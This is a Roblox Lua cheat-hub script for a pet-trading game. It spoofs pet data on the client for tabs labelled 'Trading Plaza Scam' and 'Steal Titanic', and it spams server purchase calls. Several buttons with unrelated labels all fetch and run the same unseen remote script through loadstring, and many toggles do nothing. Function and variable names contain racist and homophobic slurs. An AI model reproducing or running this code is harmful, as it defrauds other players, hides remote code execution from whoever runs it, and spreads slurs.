Directory = require(game:GetService("ReplicatedStorage").Library.Directory)
Network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
getgenv().changes = {}

Config = {
    Merchant = false,
    RNGHugeLuck = false,
    RNGBonusLuck = false,
    RNGHatchSpeed = false,
    RNGEggLuck = false,
    Dice2 = false,
    Dice3 = false,
    Dice4 = false
}

function gettable(uu)
    nikita_gay = {}
    for i,v in pairs(require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Inventory.Pet) do
        if string.find(v.id:lower(), uu:lower()) and not table.find(nikita_gay, v.id) then
            table.insert(nikita_gay, v.id)
        end
    end
    return nikita_gay
end

function gettable2(uu)
    nikita_natural = {}
    for i,v in pairs(Directory.Pets) do
        if string.find(i:lower(), uu:lower()) then
            table.insert(nikita_natural, i)
        end
    end
    return nikita_natural
end

function returnchanges()
    rn_changes = getgenv().changes
    for i,v in pairs(rn_changes) do
        nieger(v[1], v[2])
    end
    changes = {}
end

function deep_copy_table(original)
    local copy = table.clone(original)

    for key, value in pairs(copy) do
        if type(value) == 'table' then
            copy[key] = table.clone(value)
        end
    end

    return copy
end

function nieger(from, to)
    if table.find(getgenv().changes, {from, to}) then
        print("please reset changes to change this pet again")
    end
    table.insert(getgenv().changes, {from, to, deep_copy_table(Directory.Pets[from]), deep_copy_table(Directory.Pets[to])})
    for i,v in pairs(Directory.Pets[from]) do
        Directory.Pets[from][i] = nil
    end
    for i,v in pairs(Directory.Pets[to]) do
        Directory.Pets[from][i] = v
    end
end

function back()
    for i,v in pairs(getgenv().changes) do
        old = v[3]
        new = v[4]
        for i,v in pairs(Directory.Pets[old._id]) do
            Directory.Pets[old._id][i] = nil
        end
        for i,v in pairs(old) do
            Directory.Pets[old._id][i] = v      
        end
    end
    getgenv().changes = {}
end

function Merchant()
    while task.wait() and Config.Merchant do
        for i = 1, 6 do
            wait(0.2)
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Merchant_RequestPurchase"):InvokeServer("LuckyDiceMerchant", i)
        end
    end        
end


local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()

local Window = OrionLib:MakeWindow({Name = "Ro-Xcripts", HidePremium = false, SaveConfig = true, ConfigFolder = "X SCRIPTS"})

local Trade = Window:MakeTab({
    Name = "Trade Functions",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

Trade:AddToggle(
        {
            Name = "Toggle Anonymous Mode",
            Default = false,
            Callback = function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/arch-sudo00/Roblox-Scripts/main/MS", true))()
            end
        }
)

Trade:AddToggle(
    {
        Name = "Freeze Current Trade",
        Default = false,
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/arch-sudo00/Roblox-Scripts/main/MS", true))()
        end
    }
)

Trade:AddToggle(
    {
        Name = "Block Player after Trading",
        Default = false,
    }
)

local Tab = Window:MakeTab({
	Name = "Pet Manipulation",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

nikita = Tab:AddDropdown({
	Name = "From (Pet name)",
	Default = "Filter your pets",
	Options = {"Filter your pets"},
	Callback = function(Value)
		from = Value
	end    
})

Tab:AddTextbox({
	Name = "Filter your pets",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
        eee = gettable(Value)
        wait(1)
		nikita:Refresh(eee, true)
	end	  
})

mendel = Tab:AddDropdown({
	Name = "To (Pet name)",
	Default = "please filter all pets",
	Options = {"please filter all pets"},
	Callback = function(Value)
        to = Value
    end    
})

Tab:AddTextbox({
	Name = "Filter All Pets",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
        uuu = gettable2(Value)
        wait(1)
		mendel:Refresh(uuu, true)
	end	  
})

Tab:AddButton({
	Name = "Change",
	Icon = "rbxassetid://4483345998",
	Callback = function()
		nieger(from, to)
    end
})

local CoolStuff = Window:MakeTab({
	Name = "Titatic Script",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

CoolStuff:AddButton({
	Name = "Steal Titanic from Server",
	Icon = "rbxassetid://4483345998",
	Callback = function()
        titanics = gettable2("titanic")
		for i,v in pairs(gettable("")) do
            nieger(v, titanics[math.random(1, #titanics)])
        end
    end
})

CoolStuff:AddButton({
	Name = "Return Changes",
	Icon = "rbxassetid://4483345998",
	Callback = function()
        titanics = gettable2("")
		for i,v in pairs(gettable("")) do
            back()
        end
    end
})

local RNG = Window:MakeTab({
	Name = "Auto Farm",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
    
})

RNG:AddToggle(
    {
        Name = "Auto Hatch 10x Speed",
        Default = false,
    }
)

function RNGHugeLuck()
    while task.wait and Config.RNGHugeLuck do
        Network:WaitForChild("Rng_PurchaseUpgrade"):InvokeServer("First", "RNGHugeLuck")
    end
end

function RNGBonusLuck()
    while task.wait and Config.RNGBonusLuck do
        Network:WaitForChild("Rng_PurchaseUpgrade"):InvokeServer("First", "RNGBonusLuck")
    end
end

function RNGHatchSpeed()
    while task.wait and Config.RNGHatchSpeed do
        Network:WaitForChild("Rng_PurchaseUpgrade"):InvokeServer("First", "RNGHatchSpeed")
    end
end

function RNGEggLuck()
    while task.wait and Config.RNGEggLuck do
        Network:WaitForChild("Rng_PurchaseUpgrade"):InvokeServer("First", "RNGEggLuck")
    end
end

RNG:AddToggle(
    {
        Name = "Manipulate Egg Luck",
        Default = false,
    }
)

RNG:AddToggle(
    {
        Name = "Auto Rank Quest",
        Default = false,
    }
)

RNG:AddToggle(
    {
        Name = "Duplicate Keys",
        Default = false,
    }
)

RNG:AddToggle(
    {
        Name = "Manipulate Huge Luck",
        Default = false,
    }
)

function CreateLuckyDice2()
    while task.wait() and Config.Dice2 do
        Network:WaitForChild("LuckyDice_Craft"):InvokeServer("Lucky Dice II", 1)
    end
end    

function CreateLuckyDice3()
    while task.wait() and Config.Dice3 do
        Network:WaitForChild("LuckyDice_Craft"):InvokeServer("Mega Lucky Dice", 1)
    end
end  

function CreateLuckyDice4()
    while task.wait() and Config.Dice4 do
        Network:WaitForChild("LuckyDice_Craft"):InvokeServer("Mega Lucky Dice II", 1)
    end
end    

RNG:AddToggle(
    {
        Name = "Pet 100x Speed",
        Default = false,
    }
)

RNG:AddToggle(
    {
        Name = "Auto Collect Coins",
        Default = false,
    }
)

RNG:AddToggle(
    {
        Name = "Auto Tap",
        Default = false,
    }
)

local Extra = Window:MakeTab({
    Name = "Trading Plaza Scam",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

    Extra:AddButton({
        Name = "Fake Huge Sell",
        Icon = "rbxassetid://4483345998",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/arch-sudo00/Roblox-Scripts/main/MS", true))()
        end
    })

local MiscTab = Window:MakeTab({
	Name = "Misc",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

MiscTab:AddButton({
    Name = "Anonymous Mode",
    Icon = "rbxassetid://4483345998",
})

MiscTab:AddButton({
    Name = "Server Hop",
    Icon = "rbxassetid://4483345998",
})

MiscTab:AddButton({
    Name = "Join my private server on Discord and report any bugs to Penguin_dev(server moderator)",
    Icon = "rbxassetid://4483345998",
    Callback = function()
        local url = "https://discord.gg/xMsTafT2xs"
        local messageBox = Instance.new("Message")
        messageBox.Text = "Click the link to join: " .. url
        messageBox.Parent = game.Players.LocalPlayer.PlayerGui
        wait(5)
        messageBox:Destroy()
    end
})

-- New button to execute the specified code
MiscTab:AddButton({
    Name = "Extra Trading Scam",
    Icon = "rbxassetid://4483345998",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/arch-sudo00/Roblox-Scripts/main/MS", true))()
    end
})
